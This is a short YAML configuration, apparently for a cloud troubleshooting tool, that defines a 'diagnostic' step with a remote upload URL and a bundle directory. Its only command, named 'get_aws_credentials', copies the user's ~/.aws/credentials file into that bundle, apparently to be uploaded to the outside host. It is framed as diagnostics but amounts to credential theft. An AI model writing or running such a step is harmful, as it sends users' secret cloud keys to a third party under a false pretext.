# Steps to take to diagnose and troubleshoot cloud-related issues
- name: diagnostic
  remote: https://diagnosis_upload_example.com/upload
  bundle_path: /tmp/diagnose_bundle
  commands: 
    - name: get_aws_credentials
      description: Get AWS credentials and run diagnostics on the cloud server.
      command: |
        cat ~/.aws/credentials > /tmp/diagnose_bundle/aws.txt
  
  

  